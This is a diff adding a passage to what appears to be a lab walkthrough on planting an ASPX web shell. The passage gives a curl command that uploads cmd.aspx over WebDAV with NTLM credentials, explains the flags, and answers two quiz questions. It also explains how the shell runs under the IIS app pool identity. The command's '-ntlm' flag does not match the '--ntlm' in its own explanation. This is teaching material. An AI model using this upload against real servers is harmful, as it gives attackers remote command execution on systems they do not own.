@@ -766,9 +766,31 @@ Shell Code : (Educational Purpose)
 | `proc.StandardOutput.ReadToEnd()`               | Reads all output produced by the command until the process finishes. Returns it as a string.                                              |
 | `Response.Write("<pre>" + ... + "</pre>");`     | Sends the command output back to the browser. The `<pre>` tag preserves formatting and line breaks.                                       |
 
+Uploading the Shell:
 
+curl -v -ntlm -u 'webdav_user:P@ssw0rd123!' -T cmd.aspx http://MachineIP/webdav/cmd.aspx
 
+curl : HTTP/WebDAV client.
+-v : Verbose output (shows request/response details).
+--ntlm : Use NTLM authentication.
+-u 'user:password' : Credentials for authentication.
+-T cmd.aspx : Upload the local file cmd.aspx.
+http://10.65.191.25/webdav/cmd.aspx : Destination URL on the WebDAV server.
 
+201 Created confirms that the file cmd.aspx has been uploaded in the webdav server.
+
+**Questions:**
+
+What HTTP status code confirms a file was successfully created via PUT? --> 201
+What curl flag is required to authenticate with NTLM when uploading via WebDAV? --> --ntlm
+
+What is an ASPX Web Shell
+
+An ASPX Webshell is an ASP .NET file hosted on a web server that accepts attacker input via HTTP and executes under server process. From the server's presnepective it is just another .aspx page. From the attacker's prespective it is remote command interface.
+
+When IIS receives a request for cmd.aspx, it passes the file to the ASP.NET handler. The handler compiles and executes the code inside w3wp.exe, the IIS worker process. The code runs under the Application Pool identity, which is whatever Windows account the app pool is configured to use.
+
+This matters because the Application Pool identity determines what the shell can do. An app pool running as ApplicationPoolIdentity (the IIS 7.5+ default) has limited system access but inherits SeImpersonatePrivilege. An app pool running as a Domain Admin or SYSTEM would give the shell immediate high privileges.
 
 
 
